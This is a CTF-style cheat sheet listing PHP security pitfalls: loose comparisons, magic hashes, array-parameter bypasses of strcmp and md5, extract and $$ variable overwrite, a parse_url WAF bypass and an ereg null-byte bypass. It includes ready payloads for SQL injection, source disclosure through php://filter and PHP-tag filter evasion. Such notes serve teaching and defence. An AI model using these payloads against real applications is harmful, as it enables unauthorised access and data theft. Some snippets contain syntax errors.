# **PHP Common Vulnerabilities**

**Problem of `@`**
`@` will make php ignore any error messages.

``` shell=
<?php
    $A;
    echo @$A;
    if(@$A)
    {
        echo "should be write";
    }
    else
    {
        echo @$A;
    }
?>

>>> [nothing error messages]
```

**Problem of auto type transfer & urldecode**

If you `$_GET` or `$_POST` a variable as `[]=a`, then php will receive `$_GET['name']` as `[a]` (in array type), then it will call `urldecode`.

```shell=
http://PHPvulnerabilities/login.php?name[]=admin

$_GET['name'] = ['admin']
```

**Problem of strcmp()**

`strcmp(str1, str2)` : 
if `str1` smaller than `str2` return < 0
if str1 bigger than str2 return > 0
if equal, return 0

-   PHP 5.2 will format two attributes into STRING
-   After PHP 5.3.3, if compare array with string will return 0
-   PHP 5.5 will return NULL if any attribute isn't STRING


```shell=
<?php
    $get=$_GET['name'];
    echo $get;
    $file = fopen("flag.txt", "r") or die("Unable to open flag!");
    $flag = fread($file,filesize("flag.txt"));
    if(strcmp($get, $flag)==0)
    {
        echo $flag;
    }
    else
    {
        echo "YouShouldNotPass!!!!!!!";
    }
    fclose($file);
?>
```
Using `http://PHPvulnerabilities/login.php?name[]=admin` can pass it.

**Problem of sha1() & md5()**

These two function cannot deal with array, but they won't break with error message and return `FALSE`.

```shell=
<?php
        $array=[1,2];
        if(sha1($array))
        {
            echo "TRUE";
        }
        else
        {
            echo "FALSE";
        }
        if(md5($array))
        {
            echo "TRUE";
        }
        else
        {
            echo "FALSE";
        }
?>
```

```shell=
<br />
<b>Warning</b>:  sha1() expects parameter 1 to be string, array given in <b>[...][...]</b> on line <b>3</b><br />
FALSE<br />
<b>Warning</b>:  md5() expects parameter 1 to be string, array given in <b>[...][...]</b> on line <b>11</b><br />
FALSE
```

**Problem of intval()**

```shell=
var_dump(intval('2')) // 2
var_dump(intval('3abcd')) // 3
var_dump(intval('abcd')) // 0
```
if `$a` = `1002 UNION ......#`
```shell=
if(intval($a) > 1000) {
    mysql_query("select * from news where id=".$a)
}
```

**Problem of in_array()**
```shell=
if (in_array($_GET('typeid'], array(1, 2, 3, 4))) {
    $sql="select …. where typeid=".$_GET['typeid']";
    echo $sql;
}
```
`typeid` = `1’ union select...` can also pass `in_array()`.

**Problem of `==`**
```shell==
'0xccccccccc' == '54975581388' 

1 == '1'
1 == '01'
10 == '1e1'
100 == '1e2' 
0 == 'a' // a 转换为数字为 0

'0xABCdef' == '     0xABCdef'
'0010e2' == '1e3'
```

**Problem of hash**

```shell==
'0e509367213418206700842008763514' == '0e481036490867661113260034900752'

'0e481036490867661113260034900752' == '0' 

var_dump('0' == '0e1abcd');

var_dump(0 == '0e1abcd');
var_dump(md5('240610708') == md5('QNKCDZO'));
var_dump(md5('aabg7XSs') == md5('aabC9RqS'));
var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));
var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));
```

Following code to find out `0e` collisions
```shell==
<?php
$salt = 'vunp';
$hash = '0e612198634316944013585621061115';
for ($i=1; $i<100000000000; $i++) {
    if (md5($salt . $i) == $hash) {
        echo $i;
        break;
    }
}
echo '  done';
?>
```

**Problem of switch()**
```shell=
$i ="2abc";
switch ($i)  {
    case 0:
    case 1:
    case 2:
        echo "i = 2abc";
        break;
    case 3:
        echo "i is 3";
}
```

**Problem of preg_match()**

preg_match() need start & end symbol: `^` & `$`, otherwise will be bypassed.

```shell=
$ip = '1.1.1.1 abcd'; // can bypass preg_match().
if(!preg_match("/(\d+)\.(\d+)\.(\d+)\.(\d+)/",$ip)) {
  die('error');
} else {
  echo('key...')
}
```

**Problem of ereg()**

ereg() will be interrupted when it read `%00`.

```shell=
<?php
    if (ereg ("^[a-zA-Z]+$", $_GET['pwd']) === FALSE)  {
        echo 'You password must be alphabet';
    }
?>
```
`pwd=%00%27||1%23` pass it, `%00` is Null Byte.

**Problem of extract()**

If there's any variable name the same as variable name in list and be `extract()`, like `auth` in `$_GET`, it will be replaced.
```shell=
<?php  
    $auth = '0';
    //https://domain.com/test.php?auth=1
    extract($_GET); 
    if($auth == 1){  
        echo "private!";  
    } else{  
        echo "public!";  
    }
?>
```
`private!`

The same as `mb_parse_str()`, `parse_str()` 

**Problem of parse_url()**

`/1:2` will make parse_url() crash.
```shell=
//https://domain.com/test.php?file=..%2Fflag&a=/1:2
<?php
# general WAF
function waf()
{
	$keywords = [
		"flag",
	];
	$uri = parse_url($_SERVER["REQUEST_URI"]);
	parse_str($uri['query'], $query);
	foreach($keywords as $token)
	{
		foreach($query as $k => $v)
		{
			if (stristr($k, $token))
				exit();
			if (stristr($v, $token))
				exit();
		}
	}
    echo "pass";
};
waf();
?>
```
`pass`

**Problem of $$**

```shell=
// http://127.0.0.1/index.php?_CONFIG=123
$_CONFIG['extraSecure'] = true;
 
foreach(array('_GET','_POST') as $method) {
    foreach($$method as $key=>$value) {
      // $key == _CONFIG
      // $$key == $_CONFIG
      // this will destory $_CONFIG 
      unset($$key);
    }
}
 
if ($_CONFIG['extraSecure'] == false) {
    echo 'pass';
}
```
`pass`

**Problem of `<?` deector**

Detect on `<?` can be bypassed by `<script language="php">`.
```
<?php  
    //$_GET['q'] = '<?123123';
    if(strpos($_GET['q'],"<?")>=0)
        echo 'bad'.strpos($GET,'<?');
        exit();
    else
        echo 'good'.strpos($GET,"<?");
        echo $_GET['q'];
?>
```
```
q=
<script language="php">
base64_encode(file_get_contents('flag.php'));
</script>
```

**Problem of php://filter**

Read file.
```shell=
#AIS3 2017 pre-exam Web 3
/test.php?file=php://filter/convert.base64-encode/resource=flag.php
/test.php?file=php://filter/read=convert.base64-encode/resource=flag.php
```

**Problem of php://input**

Pass something.
```shell=
/test.php?file=php://input
```
